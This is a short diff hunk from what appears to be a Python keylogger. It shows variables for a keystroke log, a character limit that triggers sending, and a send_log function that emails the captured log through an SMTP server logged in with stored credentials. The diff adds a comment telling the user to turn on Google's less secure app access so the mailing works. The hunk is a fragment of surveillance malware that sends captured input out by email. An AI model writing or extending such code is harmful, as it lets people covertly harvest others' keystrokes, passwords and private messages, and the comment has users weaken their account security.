@@ -13,7 +13,7 @@ server.login(email, password)  ###Login to the server using these credentials
 log = ""  ###Setting variables
 word = ""  ###Setting variables
 email_char_limit = 75  ###Character limit before sending email
-
+###ENSURE THAT LESS SECURE APP ACCESS IS ON IN GOOGLE
 
 def send_log():  
     server.sendmail(email, email, log)
